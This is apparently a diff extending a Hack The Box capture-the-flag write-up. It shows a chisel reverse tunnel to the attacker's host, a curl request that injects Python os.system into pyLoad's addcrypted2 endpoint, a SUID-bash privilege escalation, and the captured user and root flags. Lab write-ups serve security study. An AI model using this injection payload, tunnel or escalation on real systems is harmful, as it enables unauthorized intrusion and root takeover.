@@ -47,3 +47,53 @@ uid=1001(sau) gid=1001(sau) groups=1001(sau)
 
 sau@pc:~$ cat user.txt
 474dded2f0348a7c9aacbad64cb7e513
+
+
+
+
+└──╼ [★]$ chisel server --reverse --port 1234
+2023/07/11 22:04:39 server: Reverse tunnelling enabled
+2023/07/11 22:04:39 server: Fingerprint izTDIgf3pIe+DypOlVdLmutBd4Tj0fu+cuNRh3rvtyM=
+2023/07/11 22:04:39 server: Listening on http://0.0.0.0:1234
+2023/07/11 22:04:40 server: session#1: tun: proxy#R:8000=>8000: Listening
+
+sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
+2023/07/11 21:04:15 client: Connecting to ws://10.10.14.31:1234
+
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/010ff159-666f-4e78-a64d-11f764d553d9)
+
+
+└──╼ [★]$ curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/dev/shm/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'
+HTTP/1.1 500 INTERNAL SERVER ERROR
+Content-Type: text/html; charset=utf-8
+Content-Length: 21
+Access-Control-Max-Age: 1800
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: OPTIONS, GET, POST
+Vary: Accept-Encoding
+Date: Tue, 11 Jul 2023 21:27:37 GMT
+Server: Cheroot/8.6.0
+
+Could not decrypt key
+
+```
+#!/bin/bash
+
+chmod u+s /bin/bash
+```
+```
+sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
+2023/07/11 21:27:21 client: Connecting to ws://10.10.14.31:1234
+2023/07/11 21:27:21 client: Connected (Latency 3.771334ms)
+^C2023/07/11 21:27:40 client: Disconnected
+2023/07/11 21:27:40 client: Give up
+sau@pc:/dev/shm$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+
+```
+```
+sau@pc:/dev/shm$ bash -p
+bash-5.0# cat /root/root.txt
+d54654eeb7d4934ce9f86fe80693accf
+```
